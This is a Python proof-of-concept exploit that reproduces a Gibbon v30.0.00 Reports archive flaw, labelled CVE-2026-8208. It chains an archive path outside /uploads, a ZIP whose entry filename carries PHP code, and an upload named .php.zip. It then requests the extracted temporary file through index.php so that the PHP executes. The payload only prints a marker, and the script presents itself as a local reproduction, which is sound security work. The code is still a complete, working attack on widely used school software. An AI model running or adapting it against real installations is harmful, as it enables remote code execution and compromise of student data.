#!/usr/bin/env python3
"""Reproduce the Gibbon v30.0.00 Reports archive LFI -> PHP execution chain.

This is a local-only proof against the disposable Gibbon case. It creates an
archive whose path is outside the fixed /uploads directory, uploads a ZIP whose
outer filename contains .php, and requests the extracted temporary ZIP through
the front controller. The PHP marker inside a ZIP entry filename is executed.

Expected success marker: TRIDENT_LFI_OK
"""

import datetime
import io
import json
import os
import re
import sys
import zipfile

from case_client import GibbonClient


def hidden(html, name):
    match = re.search(r'name="%s"\s+value="([^"]*)"' % re.escape(name), html, re.I)
    return match.group(1) if match else ""


def location(headers):
    for key, value in headers.items():
        if key.lower() == "location":
            return value
    return ""


def main():
    client = GibbonClient()
    client.login()

    # Step 1: create an archive with an attacker-controlled path outside /uploads.
    status, _, page = client.authenticated_get("/index.php?q=/modules/Reports/archive_manage_add.php")
    csrf = hidden(page, "csrftoken")
    nonce = hidden(page, "nonce")
    address = hidden(page, "address")
    if not csrf or not nonce:
        raise RuntimeError("archive add form did not expose csrf/nonce")

    archive_name = "TRIDENT LFI Archive %s" % datetime.datetime.now().strftime("%Y%m%d%H%M%S")
    fields = {
        "address": address,
        "csrftoken": csrf,
        "nonce": nonce,
        "name": archive_name,
        "path": "/legit_files",
        "readonly": "N",
        "viewableStaff": "Y",
        "viewableStudents": "N",
        "viewableParents": "N",
        "viewableOther": "N",
    }
    status, _, _ = client.post(
        "/modules/Reports/archive_manage_addProcess.php",
        fields,
        follow=False,
    )
    redirect = location(client.last_headers)
    match = re.search(r"editID=([0-9]+)", redirect)
    if not match:
        raise RuntimeError("archive creation did not return editID; Location=%r" % redirect)
    archive_id = match.group(1)

    # Step 2: load the upload form to get its CSRF/nonce and the required metadata.
    status, _, upload_page = client.authenticated_get(
        "/index.php?q=/modules/Reports/archive_manage_upload.php&gibbonReportArchiveID=%s" % archive_id
    )
    csrf = hidden(upload_page, "csrftoken")
    nonce = hidden(upload_page, "nonce")
    address = hidden(upload_page, "address")
    if not csrf or not nonce:
        raise RuntimeError("archive upload form did not expose csrf/nonce")

    # Step 3: build a ZIP with one legitimate student PDF and one entry whose
    # filename contains PHP code. uploadPreview only filters the inner extension.
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as zip_file:
        zip_file.writestr("1875.pdf", b"%PDF-1.4\n% TRIDENT LFI fixture\n%%EOF\n")
        zip_file.writestr('<?php echo "TRIDENT_LFI_OK"; ?>.pdf', b"fixture")
    zip_bytes = buffer.getvalue()

    fields = {
        "address": address,
        "csrftoken": csrf,
        "nonce": nonce,
        "gibbonReportArchiveID": archive_id,
        "gibbonSchoolYearID": "025",
        "reportIdentifier": "TRIDENT-LFI",
        "reportDate": datetime.date.today().isoformat(),
        "fileSeparator": "/",
        "fileSection": "1",
    }
    status, _, preview = client.post_multipart(
        "/index.php?q=/modules/Reports/archive_manage_uploadPreview.php",
        fields,
        {"file": ("spicy.php.zip", zip_bytes)},
    )
    uploaded = hidden(preview, "file")
    if not uploaded:
        raise RuntimeError("uploadPreview did not return a file path; status=%s" % status)

    # Step 4: request the uploaded .php.zip through the front controller.
    status, url, body = client.authenticated_get("/index.php?q=/%s" % uploaded.lstrip("/"))
    marker = "TRIDENT_LFI_OK" in body
    result = {
        "case": "CVE-2026-8208",
        "chain": "archive path -> ZIP upload -> temp include",
        "archive_id": archive_id,
        "uploaded_file": uploaded,
        "request_url": client.base_url + "/index.php?q=/%s" % uploaded.lstrip("/"),
        "http_status": status,
        "response_bytes": len(body),
        "marker": "TRIDENT_LFI_OK",
        "marker_observed": marker,
        "result": "VULNERABLE" if marker else "NOT_REPRODUCED",
    }
    print(json.dumps(result, ensure_ascii=False, indent=2))
    return 0 if marker else 1


if __name__ == "__main__":
    sys.exit(main())
